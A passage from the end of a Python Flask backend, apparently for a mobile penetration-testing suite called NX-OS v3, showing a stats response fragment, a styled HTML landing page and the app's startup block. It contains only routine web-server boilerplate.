        'tracking_links': len(tracking_links)
    })

# ==================== ROOT ====================
@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html><head><title>NX-OS v3</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    body{background:#05080f;color:#e8edf5;font-family:Inter,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;text-align:center}
    h1{font-size:28px;font-weight:800;letter-spacing:-1px}
    h1 span{color:#00d4ff}
    p{color:#8899bb;font-size:14px;margin-top:8px}
    .badge{display:inline-block;padding:4px 14px;background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.3);border-radius:20px;font-size:12px;color:#00d4ff;margin-top:16px}
    </style>
    </head>
    <body>
    <div>
    <h1>NX-OS <span>v3</span></h1>
    <p>Mobile Pentest Suite — Backend API</p>
    <span class="badge">● Operational</span>
    </div>
    </body>
    </html>
    '''

# ==================== MAIN ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=os.environ.get('DEBUG', 'false').lower() == 'true')
else:
    # Gunicorn entry
    app = app